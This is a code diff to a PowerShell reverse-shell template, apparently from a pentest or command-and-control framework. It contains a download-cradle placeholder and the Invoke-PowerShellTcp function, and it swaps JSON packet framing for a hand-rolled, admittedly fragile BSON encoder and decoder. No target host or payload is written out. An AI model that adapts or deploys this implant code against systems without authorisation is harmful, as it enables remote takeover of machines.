@@ -6,6 +6,63 @@ $DL_CRADLE = @'
 {{dl_cradle}}
 '@
 
+$elements = @{
+    [Double] = 1
+    [System.String] = 2
+    [System.Collections.Hashtable] = 3
+    [System.Object[]] = 4
+    [Byte[]] = 5
+    [System.Boolean] = 8
+    [Int32] = 0x10
+    [UInt64] = 0x11
+    [Int64] = 0x12
+};
+
+$enc = [system.Text.Encoding]::UTF8
+
+function ConvertTo-Bson {
+    param([Parameter(Position = 0, Mandatory = $true)] $dict)
+    $result = @()
+    foreach ($key in $dict.keys) {
+        $result += $elements[$dict[$key].gettype()]
+        $result += $enc.getbytes($key)
+        $result += 0
+        # this is only for strings. TODO: consider other types than string.
+        $result += [bitconverter]::GetBytes([Int32]($dict[$key].length+1))
+        $result += $enc.getbytes($dict[$key])
+        $result += 0
+    }
+    $result = [bitconverter]::GetBytes([Int32]($result.Length + 5)) + $result
+    $result += 0
+    $result
+}
+
+function ConvertFrom-Bson {
+    param([Parameter(Position = 0, Mandatory = $true)] $array)
+    $result = @{}
+    $isKey = $True
+    $i = 5
+    while ($True) {
+        $key = ""
+        while ($True) {
+            if ( $array[$i] -eq 0) { break }
+            $key += $enc.GetString($array[$i])
+            $i += 1
+        }
+        # TODO make more robust, ie. throw exceptions
+        $val = ""
+        $i += 5
+        while ($True) {
+            if ( $array[$i] -eq 0) { break }
+            $val += $enc.GetString($array[$i])
+            $i += 1
+        }
+        $result[$key] = $val
+        if ($i -ge $array.length - 2 ) {break}
+    }
+    $result
+}
+
 function Invoke-PowerShellTcp
 {
 
@@ -54,7 +111,7 @@ function Invoke-PowerShellTcp
             $stream.Read($bytes, 0, $len)
             $body = $bytes[0..($len-1)]
             $body = [System.Text.Encoding]::UTF8.GetString($body)
-            ConvertFrom-Json -InputObject $body
+            ConvertFrom-Bson $body
         }
     }
 
@@ -63,14 +120,10 @@ function Invoke-PowerShellTcp
             [Parameter(Position = 0)] $Packet,
             [Parameter(Position = 1)] $Stream
         )
-        $body = ($Packet | ConvertTo-JSON)
-        $body = ([text.encoding]::UTF8).GetBytes($body)
-        $packet_length = [BitConverter]::GetBytes([Uint32]($body.length))
-        if ([BitConverter]::IsLittleEndian) {
-            [Array]::reverse($packet_length)
-        }
-        $packet_type = [byte[]](0x0,0x0)
-        $Stream.Write($packet_type + $packet_length + $body, 0, 6 + $body.length)
+        $body = [byte[]](ConvertTo-Bson $Packet)
+
+        {{'Write-Debug $enc.getstring($body)'|debug}}
+        $Stream.Write($body, 0, $body.length)
         $Stream.Flush()
     }
 
